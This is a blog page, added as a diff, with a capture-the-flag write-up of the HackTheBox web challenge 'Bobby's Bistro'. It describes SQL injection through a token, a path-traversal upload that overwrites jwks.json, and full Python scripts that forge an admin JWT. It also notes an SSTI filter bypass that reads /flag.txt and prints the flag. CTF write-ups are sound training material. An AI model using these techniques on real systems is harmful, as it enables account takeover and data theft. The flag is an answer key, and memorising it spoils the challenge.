@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>HTB BOBBY’S BISTRO WRITEUP | SYC</title>
+
+<meta
+    name="description"
+    content="Challenge Scenario Bobby and I had recently created a nice little webapp to hang out and chat with our buddies, but that devil ran off to some vacation for new year. He d..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/HTB%20Bobby%E2%80%99s%20Bistro%20Writeup"
+>
+
+<meta
+    property="og:title"
+    content="HTB BOBBY’S BISTRO WRITEUP | SYC"
+>
+
+<meta
+    property="og:description"
+    content="Challenge Scenario Bobby and I had recently created a nice little webapp to hang out and chat with our buddies, but that devil ran off to some vacation for new year. He d..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/HTB%20Bobby%E2%80%99s%20Bistro%20Writeup"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="HTB BOBBY’S BISTRO WRITEUP | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="Challenge Scenario Bobby and I had recently created a nice little webapp to hang out and chat with our buddies, but that devil ran off to some vacation for new year. He d..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+HTB BOBBY’S BISTRO WRITEUP
+</h1>
+
+<div class="article-meta">
+    HTB BOBBY’S BISTRO WRITEUP.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*a8vWGIkHz6mnvlmoNgc2iQ.png" /></p>
+<h4>Challenge Scenario</h4>
+<hr />
+<p>Bobby and I had recently created a nice little webapp to hang out and chat with our buddies, but that devil ran off to some vacation for new year. He did leave a bot behind to keep an eye out though. Hope nothing happens!</p>
+<p>check the website</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*UfRhGuKIhBaMBVTVnxt74w.png" /></p>
+<p>it seems like a chat application,but chat with ai</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Dks15JVn8_1voSIVZArfjg.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*FfjJH3JBEgLKbDLPChg2AQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Srm3YGMPz6X14XItJAYc7g.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*duAUAlssoX7_L7G7N9-w3Q.png" /></p>
+<p>check the zip file</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*NZagnIJT426EGyhIX1uJ9g.png" /></p>
+<p>we can find some important details</p>
+<p>first is the /proflie</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*VVTIIDSn62Jnh0lxnruwHg.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*c3hSQC7Alprz5kTDJ8bATA.png" /></p>
+<p>we can find sql inject vulnerable here </p>
+<p>so how to control the token</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*tQ_nJlMOXMv16tArYksWmQ.png" /></p>
+<p>wow, does it means we cant control </p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*WWu7erEwfj_qGh5qt1iorA.png" /></p>
+<p>oh ,it means we can change the token in the package to achieve the sql inject after we have a real account</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*n54X6THRJ3tbHrWZmjEhMQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ASQ6csCWjf0bwEL_wruRyQ.png" /></p>
+<p>yes, the sql sentense worked</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*NYNn7ik0_QWMOfl9tBPXqw.png" /></p>
+<p>but how to use it </p>
+<p>we found a LFI at chat</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*XJHnBiMlSCJOf0S-AEzbKQ.png" /></p>
+<p>have a prof,we upload 1.txt and ../1.txt,it works</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*WUtdUOdnbU0ikOCff4IOOQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*tu9T5cXuxgIBm4vtR-_38A.png" /></p>
+<p>it will return 404,but it just becuase /app was set as cant read</p>
+<p>lets move to next step</p>
+<p>we can find the path to jwks.json</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*cU0uYjUkeeDcxgfcBYernA.png" /></p>
+<p>so we just need to upload a file as ../static/.well-known/jwks.json</p>
+<p>so use this to make my secrets json</p>
+<blockquote>
+<p>import json<br />
+from jwcrypto import jwk<br />
+key = jwk.JWK.generate(kty=”RSA”, size=2048, alg=”RS256", use=”sig”)<br />
+key.kid = “forged-admin-key”<br />
+public_jwk = json.loads(key.export_public())<br />
+jwks = {<br />
+ “keys”: [public_jwk]<br />
+}<br />
+with open(“jwks.json”, “w”) as f:<br />
+ json.dump(jwks, f, indent=4)<br />
+private_jwk = json.loads(key.export_private())<br />
+with open(“private_key.json”, “w”) as f:<br />
+ json.dump(private_jwk, f, indent=4)</p>
+<p>print(“生成成功！”)<br />
+print(“- 请将 ‘jwks.json’ 上传覆盖服务器文件”)<br />
+print(“- 保留 ‘private_key.json’ 用于本地签发 Token”)</p>
+</blockquote>
+<p>then ,use this to make my token</p>
+<blockquote>
+<p>import jwt<br />
+import time<br />
+from jwcrypto import jwk<br />
+with open(“private_key.json”, “r”) as f:<br />
+ key_data = jwk.JWK.from_json(f.read())<br />
+private_pem = key_data.export_to_pem(private_key=True, password=None)<br />
+payload = {<br />
+ “user_id”: “7728a52b-1b4b-4aae-bbf8–32f6bd605d98”,<br />
+ “username”: “bobby_2cb6814d1c47a0803392”,<br />
+ “role”: “admin”,<br />
+ “iat”: int(time.time()),<br />
+ “exp”: int(time.time()) + 3600 # 1小时后过期<br />
+}<br />
+headers = {<br />
+ “kid”: “forged-admin-key”,<br />
+ “alg”: “RS256”,<br />
+ “typ”: “JWT”<br />
+}<br />
+token = jwt.encode(payload, private_pem, algorithm=”RS256", headers=headers)<br />
+print(“\n你的伪造管理员 JWT 令牌:”)<br />
+print(token)</p>
+</blockquote>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*C5JBpBoTsP6MbV54EdFigQ.png" /></p>
+<p>upload</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*Z08_Qk-fJ7sE-okn7B2Xpw.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*jdV6rhZm8kNRdMXODIT_TQ.png" /></p>
+<p>yep, we are the admin now </p>
+<p>here we have the third problem to use</p>
+<p>SSTI</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ujKd9Xmrmkyt5h-bbV281Q.png" /></p>
+<p>so use </p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*o-W_j3s_DX_9wneaXRIFzw.png" /></p>
+<p>it use chr() bypasses the filter, single quotes bypass double quote filtering</p>
+<p>open(‘/flag.txt’).read()</p>
+<p>use curl make request</p>
+<p>we got it </p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*cT2BJ3NdduaBlFQwKkPUOA.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*qBV_CM3lPdq5X67Mclmz2A.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*_QYhWxJyk-aam7T2sR4HTw.png" /></p>
+<p><strong><em>HTB{e2644b94e29cc3492e9e0e34ca6eb34f}</em></strong></p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: HTB BOBBY’S BISTRO WRITEUP.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
